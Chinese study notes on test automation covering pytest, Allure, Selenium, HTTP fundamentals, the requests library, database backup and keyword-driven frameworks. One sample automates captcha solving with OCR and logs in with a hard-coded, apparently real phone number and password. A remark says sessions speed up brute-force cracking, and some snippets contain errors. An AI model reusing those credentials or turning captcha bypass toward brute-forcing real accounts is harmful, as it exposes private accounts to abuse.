# 运行的优先级(只能作用于实例上)
@pytest.mark.run(order=整数) # 数越小，优先级越高，可以为负数(pip install pytest-ordering)
							
# 指定执行测试用例
	# 节点法(模块名::类名::方法名)(类名和方法名可省略)(根据节点信息表述情况决定执行的用例)
    # -k 关键字法

# 给实例方法传参
	# 在实例上方或类上面写上 @pytest.mark.parametrize("data", test_data) , 且test_data必定为一个列表,并且会根据最外层列表有多少个元素来自动循环多少遍
    # 方法存在默认值参数
    	# test_data 为列表套列表形式时可以指定默认值,然后在方法中对默认值参数进行判断划分
        # test_data 为列表套字典形式,可以用变量 = data.get[键名,default]形式,若键名不存在,则变量 = default
        
```

#### pytest配置文件的使用

```python
# 在项目的目录下新建一个 pytest.ini 文件,并写入以下代码
[pytest]
# 添加参数  pytest运行时 需要的参数
addopts =-s -v
# 声明用例文件夹
testpaths = ./testcase
# 配置用例模块的命名规则  以test开头，以test.py结尾的所有文件
python_files = test_*.py *_test.py
# 配置用例类的命名规则 以Test开头的类
python_classes = Test*
# 配置用例方法的命名规则 以test开头的方法或函数
python_functions = test*
```

#### 固件和conftest.py文件

```python
# 常规固件,针对全局优先,无法做到给特定用例提供前后置操作
def setup_method(self) # 每个测试用例执行前都执行一次
def teardown_method(self) # 每个测试用例执行完成后都执行一次
@classmethon
def setup_class(cls) # 执行该类的测试用例时执行一次
def teardown_class(cls) # 执行完该类的所有测试用例时执行一次
# 自定义固件
	# 定义
    @pytest.fixture() # 声明该函数为一个固件
    def 固件名(): # 普通函数
        print('流程开始前的事')
        yield
        print('流程执行后要做的事')
    # 使用
    	# 装饰器法
        	在需要的用例上方写上 @pytest.mark.usefixtures('固件名')
        # 参数法
        	写入conftest文件中
# conftest编写全局固件
def pytest_collection_modifyitems( session, config, items) -> None: # pytest_collection_modifyitems为pytest的钩子函数
    # item表示每个测试用例，解决用例名称中文显示问题
    for item in items:
        item.name = item.name.encode("utf-8").decode("unicode-escape")
        item._nodeid = item._nodeid.encode("utf-8").decode("unicode-escape")
```



#### allure的使用

```python
# Allure是一个开源的测试报告生成工具，用于美化和增强测试结果报告的可读性和可视化效果
	# 下载解压缩allure的文件,并将bin目录添加到环境变量中,在cmd中输入allure出现版本号,表示配置成功
# 使用(pytest)
	# 为了方便使用,在pytest.ini文件中的addopts字段添加 --alluredir=temp --clean-alluredir ,--alluredir=temp 指定报告生成的目录;--clean-alluredir在生成报告之前清理报告目录。
    # 为了在pycharm中运行cmd命令需要使用os模块
    import os
    os.system('allure generate temp -o report --clean') # allure generate temp -o report --clean 表示从temp收集报告数据,并在report目录生成allure报告,每次执行前删除report中的内容
    # 查看allurt报告
    把report目录中的index.html用浏览器打开
```



### ui自动化

#### 安装及高频、特殊命令

```python
# 安装命令
pip install selenium 
	# 异常处理
        # 浏览器版本错误(也可升级selenium版本解决)
        谷歌驱动镜像地址  https://registry.npmmirror.com/binary.html?path=chromedriver/
        火狐驱动镜像地址 https://liushilive.github.io/github_selenium_drivers/md/Firefox.html
        edge驱动镜像地址 https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/
    
	# 自定义driver的路径
    from selenium.webdriver.chrome.service import Service as ChromeService
    service = ChromeService(executable_path=driver_path)
    driver = webdriver.Chrome(service=service)
  
  # 直接调试本地浏览器，可免去登录
  	    def create_brow(cls):
        if cls.driver is None:
            command = f"'{cls.chrome_path}' --remote-debugging-port=9222"
            os.popen(command)
            option = webdriver.ChromeOptions()
            option.add_experimental_option("debuggerAddress", "127.0.0.1:9222")
            cls.driver = webdriver.Chrome(options=option)
        return cls.driver
    
    # 代码执行完成后不自动退出
    opt = webdriver.ChromeOptions()
	opt.add_experimental_option('detach',True)
    driver = webdriver.Chrome(options=opt)
    
# 高频命令
from selenium import webdriver # 导入
driver = webdriver.Chrome() # 定义google浏览器
driver.get(url) # 打开指定链接
driver.maximize_window()  # 窗口最大化
	driver.minimize_window()  # 窗口最小化
    
# 特殊命令
	# 获取当前页面的url
     driver.current_url 
        
	# 删除当前窗口地址下所有cookie
    driver.delete_all_cookies() 
  
    # 鼠标操作,链式操作,一般直接使用,不定义变量,结尾必须有perform()
    from selenium.webdriver import ActionChains # 导入模块
    ActionChains(driver).drag_and_drop_by_offset(find_ele(method,value),x,y).perform() # 拖动x,y # driver:执行用户操作的WebDriver实例
	ActionChains(driver).click_and_hold(find_ele(method,value)).perform() # 悬停鼠标   
    ActionChains(driver).context_click(find_ele(method,value)).perform() # 右键鼠标
    
    # 键盘操作
    from selenium.webdriver import Keys
    driver.find_element('xpath', '//html').send_keys(Keys.键盘命令) # 键盘命令可通过查看Keys的源码获取
    
    # 截屏操作
    	# selenium
            # 针对窗口截图
            driver.save_screenshot(path) # 保存png到本地
                driver.get_screenshot_as_file(path) # 保存png到本地
            driver.get_screenshot_as_png() #得到图片的字节数据，可通过wb写入到文件中
            driver.get_screenshot_as_base64() #得到图片的base64字符串数据，前端可直接用来渲染base64数据
            # 针对元素截图   
            ele.screenshot(文件名) # 得到该元素的png截图
            ele.screenshot_as_png  # 得到元素图片的字节数据
            ele.screenshot_as_base64  # 得到元素图片的base64字符串数据

    # 验证码OCR识别(ddddocr模块)
    pip install ddddocr # 安装
    from ddddocr import DdddOcr # 导入
    DdddOcr(show_ad=False).classification(图片的字节信息) # 识别图片,图片的二进制信息可以用rb读取图片或者ele.screenshot_as_png获取网页验证码二进制
    
driver.refresh()   # 刷新按钮
driver.back()    # 后退按钮
driver.forward()  # 前进按钮

# 强制等待
time.sleep(2)  # 等待2秒
# 隐式等待,设置一次作用全局,在创建driver对象后下面写,比显示等待优先级高.作用于页面刷新时
driver.implicitly_wait(2) # 全局等待2秒 
# 显式等待,作用于页面刷新时
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
wait = WebDriverWait(driver,5) # 最长等待5秒,默认每0.5秒找一次
wait.until(EC.presence_of_element_located((method,value))) # 查找元素的格式
# 关闭
driver.close()  # 关闭当前所在窗口,不会自动切换,且无法退出模拟浏览器
driver.quit()   # 关闭整个浏览器对象  
```

#### switch_to命令

```python
driver.switch_to.new_window()  # 打开一个空白新窗口 操作自动切到新窗口
driver.switch_to.window(指定窗口名)  # 切换到指定窗口

# 快速切换到指定标签名窗口
driver.current_url   # 查看当前窗口的url
driver.title    # 查看当前窗口的标签名
driver.window_handles # 获取所有的窗口名称。(该名称为字符和数字的组合)
    driver.current_window_handle #  获取当前窗口名称
for i in driver.window_handles:
    driver.switch_to.window(i)
    if "目标title" in  driver.title: 
        break
        
# 弹窗交互
alert = driver.switch_to.alert # 将当前的驱动程序切换到弹窗(alert)上，以便可以与弹窗进行交互
                               # 仅适用于处理由浏览器生成的弹窗
    alert.accept() # 接收弹窗
    alert.dismiss() # 取消弹窗
    alert.text # 获取弹窗文本

# 内嵌框架切换
driver.switch_to.frame(ele) # ele为frame的id值或name值,如果页面上没有这两个值,可以使用js语法增加一个值
driver.switch_to.parent_frame() #  返回上一层iframe
driver.switch_to.default_content() # 从iframe切换到主文档
```

#### js语法

```python
# 执行JS语法
driver.execute_script(js语法) # 浏览器执行JS语法

# 滚动页面
driver.execute_script(arguments[0]).click() # 点击元素所在的xpath位置，一般用变量接受其值
	driver.execute_script(window.scrollTo(x,y))    # 滚动进度条到指定x，y位置
	driver.execute_script(window.scrollBy(x,y))    # 基于当前位置滚动进度条
	driver.execute_script(window.scrollTo(0, document.body.scrollHeight))    # 滚动到页面底部

# 修改页面上不可交互或日期选择器的值或查看隐藏属性的值，也会受到frame的影响
 # 右键复制该标签的selector，得到一个值 ele
 # 先到控制台进行模拟,格式如下
f'document.querySelector('{ele}').value = 设定值' # 修改属性值
f'document.or('{ele}').value' # 查看属性值
```



#### 八种定位方式

```python
# 若定位的元素为id属性,应用id方法,不是则优先考虑xpath，再考虑css
# 网页上的元素标签格式为 <标签名>属性1=属性值1 属性2=属性2 <标签名>
    # xpath(万能)
    driver.find_element('xpath','xpath路径') # 找到符合条件的第一个元素，定位不到会报错
    driver.find_elements('xpath','xpath路径') # 找到符合条件的所有元素
        # 定位方式:xpath
        # // 表示相对路径
            # //a 表示找当前页面所有的a标签
            # //* 表示任意标签
        # //*[text() = 文本内容] # 通过标签的文本来定位
        # //*[@属性名=属性值]     通过标签的属性定位
        # (//*[@属性名=属性值])[数值]       该数值1就是1,不同于下标,可以用来查找多个元素的几个元素
        # //*[contains(text() = 文本内容)]  找到包含文本内容的元素，模糊查找
        # //*[contais(@属性名,属性值)] 找到包含元素的内容
        # //*[@class="pay-money"]/.. 子找父
        # 同级互找
            # //*[@data-pid="RDi163eZ"]//preceding-sibling::p(同级之前)
            # //*[@data-pid="RDi163eZ"]//following-sibling::p(同级之后)  
        
    # id 
    driver.find_element('id','id对应的值')  
    # class
    driver.find_element('class name','class对应的值') # 值中间的空格用点号代替
    # name
    driver.find_element('name','name对应的值') # 值中间的空格用点号代替
    # tag name
    driver.find_element('tag name','a标签的文本内容')
    # link text (只能针对a标签的文本内容进行定位)(无法对更内部的进行查找)(文本必须完全一致)
    driver.find_element('link text','文本内容')
    # partial link text 只能针对a标签的部分文本内容(模糊匹配)进行定位
    driver.find_element('partial link text','文本内容')
    # css(万能)
    	# 通过标签的css定位器进行定位，可以对标签右击选择copy然后 选择 copy selecotr得到对应的值
        
# ui自动化元素无法定位常见问题
    1.时间等待
    2.窗口切换
    3.弹窗切换
    4.嵌套页面
    5.元素定位错误
    6.页面更新元素定位未及时更新
    7.元素动态变化
    8.。。。
```

#### 元素的操作

```python
# ele为定位方式的变量
ele.send_keys(内容) #  给指定元素输入指定的内容
ele.clear()   # 清空元素对象
ele.click()  # 点击元素对象
ele.text    # 获取到元素对象的文本内容值
ele.get_attribute(属性名) # 获取元素对象指定属性对应的值
```

#### 下拉框的额外操作方式

```python
from selenium.webdriver.support.select import Select # 导入Select
sel = Select(select标签元素的定位)
sel.select_by_index(index)  # 通过下标索引进行定位
sel.select_by_value(option标签的value属性值)  # 通过option标签的value属性值进行定位
sel.select_by_visible_text(option标签的文本内容)  # 通过option标签的文本内容 进行定位

# 局限性：webdriver的选择下拉框操作只能针对select标签且选项是option的选择下拉框元素，因此仍然常用元素定位然后点击的操作
```

### 接口

#### 基本知识

###### 基本知识

- 接口，又称API 软件接口,指一个请求和响应的流程
- 接口测试是测试`请求和响应流程`的流程
- 幂等性：对于同一个请求地址，相同的参数以及值，发送出去后，服务端给的响应信息应该是唯一。 防止重复提交。锁。
- ==为什么要有接口测试==
  - 接口测试因为绕开了前端的限制,可以发现功能测试(ui测试)发现不了的bug
  - 功能测试需要前后端都完成后才可以进行测试,而接口测试只需要后端完成接口即可.因此接口测试可以更提前进场,更早的发现bug
  - 接口的测试效率更高
- 相关知识
  - [金字塔模型和橄榄模型](https://blog.csdn.net/lijing742180/article/details/90789932)
  - [接口测试的意义](https://blog.csdn.net/candy_tse_1/article/details/99452378)
- 测试流程
   - `抓包 找到对应的请求`
   - `模拟构建请求数据包 (注意请求方式 请求地址  请求头 请求正文)`
   - `使用代码或者工具 发送请求并获取响应`
   - `校验响应是否符合期望`

- 接口测试相关理论
  - MVC三层架构 
    - `M:model 模型层/数据库层`
    - `V:view 视图层/显示层`
    - `C:control 逻辑层/控制器层`
  - B/S架构:Browser/Server 浏览器服务模式
  - C/S架构:Client/Server 客户端服务模式
- DNS(Domain Name System域名系统) 
   - 将域名和ip一一映射的一个分布式数据库服务,域名就是ip地址的别名

- Web的交互流程(见下图)(每一个独立电脑都有对应的一个ip且绝不会重复;电脑上每一个进程都有其对应的一个端口,且不会重复,ip+端口可指定电脑的指定进程)
   ![image-20230809173253716](测试开发.assets/image-20230809173253716.png)

###### ==**URL的构成**==(uniform resource locator 统一资源定位 )

- 完整的 URL格式:   协议://域名或IP地址:端口/资源路径?参数名1=参数值1&参数名2=参数值2&...
  - 协议:http/https/FTP等
  - 域名/ip  
  - 端口   <font size="3" color="red">https 默认端口是443  http是80 (端口范围 0-65535)</font>
  - 资源路径默认是 / 表示根路径
  - 参数部分(可选项) ?后面接的就是 查询字符串参数   格式  ?参数名1=参数值1&参数名2=参数值2&....


###### ==TCP/IP 模型==

- 应用层:http  https  ftp  smtp 
- 传输层 :TCP   UDP
- 网络层 :IP 
- 访问层/物理硬件层

###### TCP和UDP的区别

- TCP 面向连接协议,需要三次握手建立连接,四次挥手关闭链接.特点传输稳定不易丢包,缺点传输效率低.因此对数据完整度有严格要求时应使用tcp 
- <img src="https://ask.qcloudimg.com/http-save/yehe-4923892/089a90af29183534348d8dfe781e9501.jpeg" alt="img" style="zoom:50%;" />
  - `为什么必须是三次握手`
    - `采用三次握手的原因涉及到网络通信的可靠性和数据同步的问题.`
    - `两次握手不足够可靠：在两次握手的情况下，客户端发送请求后，如果这个请求在网络中发生了延迟，在服务器端被误认为是失效的连接请求，会发送一个回复，这可能导致客户端误认为连接已建立，从而造成数据的不同步和混乱。`
    - `四次握手多余：在三次握手后，已经建立了双向的确认。多余的握手步骤会增加连接建立的时间和开销。`
  - `为什么是四次挥手`
    - `同样涉及到网络通信的可靠性和数据同步的问题`
    - `确保数据完整传输：在断开连接时，双方可能还有未完成的数据传输，所以需要进行多次确认来确保数据的完整性。四次挥手可以让双方在关闭连接之前完成数据的传输和确认。`
    - `保证可靠的关闭过程：四次挥手能够确保在关闭连接时双方都有机会发送关闭请求和确认，避免了类似于两次握手那样可能导致误解的情况。`
    - `解决连接复用问题：TCP允许在同一端口上复用连接，四次挥手的流程能够更好地支持连接的复用和重新建立。`
- UDP 非面向连接协议,
  - 无需连接直接发送,特点传输效率快 但是易丢包,因此对速度要求较高时用UDP

- 其他区别
  - `TCP 是面向字节流的协议，将数据视为一系列无结构的字节流；UDP 是面向报文的协议，将数据视为独立的报文单元。`
  - `TCP 具有拥塞控制机制，网络拥塞时会降低发送速率；UDP 没有拥塞控制，网络拥塞不会降低发送速率。`
  - `每条 TCP 连接只能是点对点的通信；UDP 支持点对点、一对多、多对一和多对多的交互通信。`
  - `TCP 首部开销为 20 字节；UDP 首部开销较小，只有 8 字节。`
  - `TCP 提供全双工的可靠通信信道；UDP 提供不可靠信道。`

######  http(端口80)和https(端口443)协议

- http(Hypertext Transfer Protocol),通常运行在TCP之上,它决定了客户端能发送给服务器什么样的消息以及得到什么样的响应.

  - 特点:支持B/S架构;==简单快速灵活==;支持多种请求方式;无连接;无状态;明文传输

    - http被称为’无连接’协议，是因为每个http请求都是独立的，服务器和客户端不会保存持久连接，每次客户端发送请求，服务器处理请求并发送响应后，立即断开连接.且后面的请求是无法知道前面请求的内容
      - 为了解决频繁连接断开,因此http协议头部信息里添加一个Connection:keep-alive(默认开启),表示服务器同意保持连接打开一段时间，以便在同一连接上可以发送多个请求和响应。
    - http属于明文传输协议,传输效率相对较高但安全性相对较低  

  - 为了应对一些长连接的场景,产生了ws(websocket)协议

    - ws协议和http协议的区别

      - ws协议只要建立连接,后续所有的信息均在该连接上传输,典型的有弹幕系统

      - ws协议虽然第一次建立连接时采用http发送请求,使用tcp传输协议.但连接创建成功后的信息后续跟http协议无关

      -  [websocket在线调试网址](http://www.websocket-test.com/)

      - 状态保持机制

        - cookie

          - 优点:==简单快速灵活==,可以很快地被创建、读取和处理,==浏览器会自动携带该域名下的所有cookie发送到服务器==

          - 缺点:文件直接保存在用户本地,不安全,且容易被他人劫持修改,而且大小会受到限制

            <img src="测试开发.assets/image-20230809201833479.png" alt="image-20230809201833479" style="zoom:50%;" />

        - session

          - 优点:Session 数据存储在服务器上,客户端会发送一个唯一的标识符来与服务器建立连接,比cookie更安全

          - 缺点:多了存储和读取的过程,效率降低,虽然比cookie安全性高,但仍然存在被他人劫持的风险,且会占用大量的服务器空间,而且用户可以删除cookie来控制会话

            <img src="测试开发.assets/image-20230809202112782.png" alt="image-20230809202112782" style="zoom:50%;" />

        - token(令牌)

          - 优点:可以进行加密和签名来保护传输的数据,安全性大大提高,且令牌可以在客户端存储,节省服务器性能

          - 缺点:数据需要加解密,因此效率再次降低,且仍然会存在令牌泄露遭到劫持的风险,而且用户可以通过删除令牌来控制会话

            <img src="测试开发.assets/image-20230809203729610.png" alt="image-20230809203729610" style="zoom:50%;" />

  - 为了解决http的明文传输问题,引入了https协议**(https =http+ ssl/tls/)**

    - https属于加密传输协议,相对于http，安全性相对较高,但传输效率相对较低.而且加密需要得到官方的认证,且CA认证证书需要花钱

###### 捕获工具fiddler

- 充当一个中间代理,客户端和服务端的数据都需要先经过这个代理再进行转发
- `只能抓http，tcp和udp是wireshark`

###### 请求和响应的数据包结构([请求头和响应头的相关知识](https://www.cnblogs.com/klb561/p/10090540.html))

- 请求数据包的结构
  - 第一部分:请求方式 url地址 协议版本
  - 第二部分 请求头
  - 第三部分 空行
  - 第四部分 请求正文
    - 有时候请求并不会有请求正文或正文为空，这也就是因为为什么抓包时请求没有负载的原因
- 响应数据包的结构
  - 第一部分 协议版本 状态码(状态码信息)
  - 第二部分 响应头
  - 第三部分 空行
  - 第四部分 响应正文
- 请求方式get和post的区别
  - get表获取,一般用于<font size="3" color="red">**查询类**</font>的请求;post表提交,一般用于<font size="3" color="red">**修改类**</font>的请求
  - get请求会将参数放在url中,并以url形式进行编码;post请求参数在正文中,不会进行编码
  - 因url存在长度限制,所以get请求参数存在长度限制,典型例子为百度的搜索框存在长度限制;而post请求不存在长度限制,因此上传文件一定是post请求(浏览器默认请求方式get请求)
  - get请求可以被浏览器历史记录,能够回退前进,而post不会
  - get请求最少发送一个tcp数据包(请求头部和查询参数) ;post请求最少发送两个tcp数据(请求头部和请求体的头部;请求体数据)
  - 请求方式一般遵循Restful规则
  - 在没有相关请求时,提前编写代码,要用mock(无中生有)
    - `团队可以并行工作`
    - `        可以模拟那些无法访问的资源`
    - `        提高测试覆盖度`
    - `        隔离系统`
- ==常见的头部信息==
  - `Authorization`:认证证书,请求数据包出现该头部信息 模拟构建请求数据包的时候一般都要加上
  - Cookie:  存储用户信息,请求数据包出现该头部信息 模拟构建请求数据包的时候一般都要加上
  - Set-Cookie:设置用户信息,当响应数据包出现该信息会在用户端设置cookie
  - content-type:声明内容类型,可见
    - text/plain ：纯文本格式 
    -  application/json：JSON数据格式
    - <font size="3" color="red">multipart/form-data</font>:上传文件必定会用到的格式
    - application/x-www-form-urlencoded ：表单数据会被编码成类似于 `key1=value1&key2=value2` 的格式
  - Referer : 操作从哪里访问的,即来路,上一个页面
  - User-Agent: 声明当前请求发送出来的设备

###### [协议状态码](https://www.cnblogs.com/CoderMonkie/p/7872276.html)

- 1** : 继续
  - `100 Continue(继续):表示服务器已经收到客户端的部分请求，并要求客户端继续发送剩余部分。通常在客户端发送大型数据时使用。`
  - `101 Switching Protocols(切换协议):表示服务器已经理解客户端请求，并将切换到不同的协议`
  - `102 Processing(处理中):这个状态码是一个临时响应，表示服务器正在处理请求，但尚未完成。`
  - `103 Early Hints()(早期提示):这个状态码用于在服务器向客户端发送响应头部时，可以在响应头中包含一些提示信息，用于客户端做出更好的决策。`
- 2** : 成功
  - `200 OK(成功)表示请求已成功处理，并返回所请求的数据。这是最常见的成功状态码。`
  - `201 Created(已创建)：表示请求已成功处理，并且服务器创建了新的资源。`
  - `202 Accepted(已接受)：表示服务器已接受请求，但尚未完成处理。通常用于异步操作。`
  - `204 No Content(无内容)：表示请求已成功处理，但响应中没有实际内容返回。用于不需要返回数据的请求，如删除操作。`
  - `206 Partial Content(部分内容)：表示服务器已成功处理部分请求，通常用于支持分段下载或断点续传。`
- 3** : 重定向

  - `300 Multiple Choices(多种选择)：表示请求的资源有多种表示形式，客户端可以选择其中一个。`
  - `301 Moved Permanently(永久重定向)：表示请求的资源已永久移动到新的位置。客户端应该更新其链接。`
  - `302 Found(临时重定向)：表示请求的资源已临时移动到新的位置。但这个状态码有时被用于表示临时性重定向，而不是遵循标准的 303 或 307。`
  - `303 See Other(查看其他位置)：表示请求的资源可以在不同的 URI 下被找到，应该使用 GET 请求重定向到新的 URI。`
  - `304 Not Modified(未修改)： 表示客户端缓存的资源仍然有效，不需要重新传输。客户端可以使用本地缓存。`
  - `307 Temporary Redirect(临时重定向)：类似于 302，表示请求的资源已临时移动到新的位置。客户端应该继续使用原始的请求 URI。`
  - `308 Permanent Redirect(永久重定向)：类似于 301，表示请求的资源已永久移动到新的位置。客户端应该更新其链接。`
- <font size="5" color="red">4** : 客户端错误</font>
  - `400 Bad Request(错误请求)：表示服务器无法理解客户端的请求，通常是因为请求中包含无效的参数、格式错误等。`
  - `401 Unauthorized(未授权)：表示请求需要身份验证，但提供的凭据无效或缺失。客户端可能需要提供有效的身份验证信息。`
  - `403 Forbidden(禁止访问)：表示客户端没有访问请求的资源的权限，服务器拒绝了请求。`
  - `404 Not Found(未找到)：表示服务器无法找到请求的资源，通常是因为请求的 URL 错误或资源不存在。`
  - `405 Method Not Allowed(方法不允许)：表示请求的 HTTP 方法(GET、POST 等)不适用于请求的资源。`
  - `406 Not Acceptable(不可接受)：表示服务器无法根据客户端的请求头中的内容特性完成请求。`
  - `408 Request Timeout(请求超时)：表示服务器在等待请求时超时。客户端可能需要重新发送请求。`
  - `409 Conflict(冲突)：表示服务器无法处理请求，因为请求与服务器上的资源冲突。`
  - `410 Gone(已删除)：表示请求的资源已永久删除，不再可用。`
  - `415 Unsupported Media Type：客户端发送的请求的"Content-Type"头部与服务器预期的不同，或者请求体的格式与服务器无法处理的` 
  - `429 Too Many Requests(请求过多)：表示客户端发送的请求过多，服务器拒绝了请求以避免超负载。`
- 5** : 服务端错误

  - `500 Internal Server Error(内部服务器错误)：表示服务器在处理请求时发生了未知的错误，可能是由于服务器内部的配置或代码问题引起的。`
  - `501 Not Implemented(未实现)：表示服务器不支持客户端请求的功能或方法。`
  - `502 Bad Gateway(错误的网关):表示服务器作为网关或代理，从上游服务器接收到无效的响应`。
  - `503 Service Unavailable(服务不可用)：表示服务器当前无法处理请求，可能是由于过载或维护等原因。`
  - `504 Gateway Timeout(网关超时)：表示作为网关或代理的服务器在等待上游服务器的响应时超时。`
  - `505 HTTP Version Not Supported(HTTP 版本不支持)：表示服务器不支持客户端请求的 HTTP 协议版本。`
  - `507 Insufficient Storage(存储不足)：表示服务器无法处理请求，因为存储空间已满。`

###### 业务状态码

- 业务状态码通常是指在 API 响应中表示特定业务情况的状态码,在响应正文中体现,一般为企业自定义码,且一般会有个msg或message的提示文本

###### 抓包如何区分前后端bug

- 如果是页面效果类、显示类的问题，基本属于前端bug
- 数据类出错
  - 先看请求的参数是否符合预期，不符合则是前端bug，前端提取数据存在问题
  - 再看响应的结果是否符合预期，不符合则是后端bug，后端对应的业务逻辑存在问题
  - 最后看页面渲染的效果是否符合预期，不符合则是前端bug，前端处理响应的数据存在问题



### requests相关命令
```python
# 安装
pip install requests

# 通过指定的请求方式,访问指定的url地址获取一个响应对象,相关参数可以不写.
res = requests.requests(请求方式,url地址[,相关参数])
res = requests.请求方式(url地址[,相关参数])
res.text # 获取页面的文本内容，以字符串显示
res.content # 获取页面的文本内容，以字节显示
	# 解决响应内容乱码
    	# 法一
		res.encoding =指定编码
        res.text 获取内容
        # 法二
        res.content.decode(指定编码) 获取响应内容
res.status_code # 获取状态码
res.request.headers # 请求头
res.headers # 响应头
res.request.path_url # 请求的资源路径
res.request.body # 请求正文
res.cookies # 提取cookie
# 自定义请求头
 head = {参数1:值....}
    res.requests.请求方式(url,headers=head)
# get发送查询参数
    # 方案一: 
        # 因为查询字符串参数直接在url中体现 所以可以直接写在url中  推荐使用
    # 方案二:  
        # 定义一个字典 p={查询字符串参数1:对应值,查询字符串参数2:对应值,....}
        # 请求中携带该字典 res = requests.请求方式(请求地址,params=p)
# post请求发送application/x-www-form-urlencoded 类型数据
	# 字典
    data = {参数1：值，参数2：值...}
    res.requests.post(url,data=data) # 会自动在请求头中添加 content-type：application/x-www-form-urlencoded
    # 字符串，需手动添加application/x-www-form-urlencoded请求头
    data = '参数1=值&参数2=值..'
    head = {'Content - type':'application/x-www-form-urlencoded'}
    res.requests.post(url,data=data,headers=head)
# post请求发送二进制文件内容(发送 multipart/form-data 类型数据 )
	# 发送form-data时一定不要自定义关于文件类型content-type的标头，其分隔符是随机生成的
file = {参数: open(文件路径,'rb')}
res.request(请求方式,url,files = file)

# post请求发送json数据(发送application/json数据)
	# json数据格式:内部数据为字典类型,但为字符串
    json.loads(data) # 相当于快速将字符串类型转为字典类型
	res.json() # 将响应的相应json数据转为python的类型，相当于 json.loads(res.text)
	# 发送json数据
    res.requsets(请求方式,url,json = json.loads(data))
    
# 无万能验证码如何进行登录
import json,requests 
from ddddocr import DdddOcr
url_login = 'https://www.woniuxy.com/sys/user/login' # 登录接口
url_verify = 'https://www.woniuxy.com/sys/user/captcha' # 验证码接口
sess = requests.Session() # 设定一个sess,利用其自动保留cookie的设置
a = sess.request('get', url_verify) # 获取验证码的cookie和内容
ver = DdddOcr(show_ad=False).classification(a.content) # 识别验证码
data = json.loads(f'{{"tel":"18238560259","password":"zx8UBWrE2Gafsf5","captcha":{ver},"loginType":1}}') # 将json格式转为python格式
b = sess.request('post', url_login,json = data) # 设置json内容，并进行登录
print(b.text) # 打印响应内容

# 会话技术保留cookie：会话进行登录成功的流程后,会记忆登录的相关信息,包括cookie,后续可以直接访问其他请求  
 sess=requests.session() # 创建会话对象  
  # 因为会话拥有连接持久化特性，在频繁发送多个请求时，减少了连接建立和断开的时间，因此在进行暴力破解时会比正常的请求要快很多
  # 使用会话对象进行登录成功的操作
	# 后续使用会话对象进行其他操作

# 创建多个会话
sess_dict = {}
	多次进行单个会话的创建流程，并将sess以 标识符:sess 保存到sess_dict中

# 设置token的cookie(标志:在请求正文或请求标头中存在token/authaction/accesstoken)
	# 在登录成功页面获取token
    # 设置sess的cookie的token数据
    # 法一
    	sess.cookies['authorization'] = json.loads(b.text)['data']["accessToken"]
    # 法二
    	sess.cookies.set('authorization',json.loads(b.text)['data']["accessToken"])
    # Authorization
    headers = {'Authorization': f'Bearer {token}'}
	session.headers.update(headers)

# 一个良好的自动接口测试代码应该有参数输入(全部传  部分传 参数组合)、功能实现、输出结果、异常容错
```

### 自动备份和还原数据库信息

```python
import datetime,subprocess,os

def backup_mysql_database(host='localhost', user='root', password='123456', database='woniusales',backup_path=r'D:\qqfile'):  # 备份数据库
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    backup_filename = f'{database}_backup_{timestamp}.sql' # 设置文件名
    try:
        subprocess.run([
            'mysqldump',
            f'--host={host}',
            f'--user={user}',
            f'--password={password}',
            f'--databases',  # 注意这里去掉了等号，正确的分隔
            f'{database}',  # 数据库名
            '--result-file',  # 参数之间加上空格
            f'{backup_path}\\{backup_filename}'])
    except Exception as e:
        print(f'Error during backup: {e}')
    path = f'{backup_path}\\{backup_filename}'
    return path

def return_mysql(sql_file_path, mysql_executable=r'D:\phpstudy_pro\Extensions\MySQL5.7.26\bin\mysql'): # 还原数据库
    subprocess.run([mysql_executable, '--user=root', '--password=123456', '--host=localhost', 'woniusales', '-e',f'SOURCE {sql_file_path}'])
    os.system(f'del {sql_file_path}') # 删除数据库文件
```



#### postman(快速的调试接口是否合适和正确)

##### [使用方法](https://mp.weixin.qq.com/s/1V6mlQlMU77nOKNwrLhqkQ)

###### cookie添加token或其他内容(token为集合变量)

- 引用变量为`{{}}`

![image-20230814163907830](测试开发.assets/image-20230814163907830.png)

### 加密(接口安全)

###### 常见加密类型

- 对称加密(公私钥一致)
  - 公钥加密,私钥解密,私钥加密,公钥解密,
  - 简单快速灵活,但安全性差,只要一方泄露,就无安全性可言
- 非对称加密(公私钥不一致)(如随机想三位数  乘 91  告诉我后三位)
  - 较为安全,一方泄露也不会对另一方有影响,但本质上是利用数学规律,需要消耗资源去解密
- hash散列加密(md5加密)
  - 单向加密,只能加密,不能解密,适用于用户敏感信息存储
  - 特点是固定输入,固定输出,唯一输入,唯一输出,但容易被大数据爆破,因此在项目中会对加密流程进行‘加盐’处理.相关操作有在对数据加密前将一个随机字符串进行合并,然后再进行加密,或者随机选择一种加密方式进行第一次加密,然后再使用hash加密
- 测试中遇到需要对参数进行加密如何操作
  - 看使用文档是否有注明该内容的加密规则,无则询问前端开发人员
  - 在传参前对参数进行加密处理

## 测试框架

###### 测试框架和自动化测试的区别

- 自动化测试:ui自动化和接口自动化都是将用例以代码的形式写在项目中,需要懂代码的人编写对应的自动化用例
- 测试化框架:无页面的测试工具,仍需要一定的代码基础.普通测试人员编写测试用例
- 测试平台:以可视化的页面,让普通测试人员也可以进行自动化测试
  - 主流自动化测试思想
    - 单例\POM\DDT\\**KDT(关键字驱动测试)**

###### 测试框架实现流程

- 制定关键字规则,KDT类中封装对应的以关键字取名的操作方法

- 解析用户输入的关键字步骤字符串,变成可用来执行的步骤列表

- 利用反射优化执行步骤

  - ```python
    getattr(对象,字符串[,default]) # 对象无该字符串时,无default会报错,有default会返回默认值 
    hasattr(对象,字符串) # 去对象中查找有没有这个字符串,有则返回True,没有返回False
    setattr(对象,字符串,新的值) # 设置对象中指定字符串的属性为指定的值  有就是修改没有就是新增属性
    delattr(对象,字符串,)  # 删除对象中指定字符串的属性
    ```

  - 优化用户输入,(用户可能输入python的语言或中文字符两种情况)

    ```python
    dict.get(by,by)
    ```

- 将原有的执行流程和前提条件面向对象拆分构建
- 定义入口文件,执行用例

###### 优化代码

- 增加异常容错
  - 套用pytest进行测试,allure生成报告.但后期报告格式需要改变时,很难扩展
  - 手写异常容错:给执行的操作添加异常容错
- 增加断言
  - 因为assert抛出异常时只会提示AssertionERRor,因此需要自定义异常
- 自定义测试模板
  - 确定好报告模板,用于数据填充
  - 采集每个用例中用于填充给报告的数据
    - 数据持久化保存,以文件(数据库)形式存储数据
      - 采集数据和生成报告可以分离,可以追踪到历史记录,但会占用存储空间
    - 内存存储
